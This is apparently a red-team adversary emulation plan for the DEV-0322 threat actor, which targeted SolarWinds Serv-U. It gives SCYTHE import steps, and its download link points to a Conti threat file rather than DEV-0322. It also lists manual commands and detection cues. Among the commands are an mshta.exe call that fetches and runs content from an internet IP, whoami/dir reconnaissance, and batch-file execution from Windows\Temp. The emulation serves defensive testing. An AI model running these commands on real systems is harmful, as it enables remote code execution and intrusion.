# DEV-0322 Adversary Emulation Plan

This threat is based on Microsoft Threat Intelligence Center (MSTIC) report post on July 13, 2021: https://www.microsoft.com/security/blog/2021/07/13/microsoft-discovers-threat-actor-targeting-solarwinds-serv-u-software-with-0-day-exploit/

## Emulate with SCYTHE
1. Download and import the threat in JSON format to your SCYTHE instance - https://raw.githubusercontent.com/scythe-io/community-threats/master/Conti/Conti_scythe_threat.json
2. Create a new campaign
3. Import from Existing Threat: DEV-0322
4. Launch Campaign
5. Execute from an EXE

## Emulate manually
Open a command prompt and run these commands:
- ``` C:\Windows\System32\mshta.exe http://<An Internet IP>```
- ```cmd.exe /c whoami > whoami.txt```
```cmd.exe /c dir > dir.txt```
- ```cmd.exe /c echo whoami > C:\Windows\Temp\Serv-U.bat```
- ```cmd.exe /c "C:\Windows\Temp\Serv-U.bat"```
- ```powershell.exe "C:\Windows\Temp\Serv-U.bat"```

## Detection & Response
- An executable spawning mshta.exe
- An executable spawning cmd.exe
- An executable spawning powershell.exe
- An executable spawning whoami
- An executable spawning dir
- mshta.exe reaching out to the internet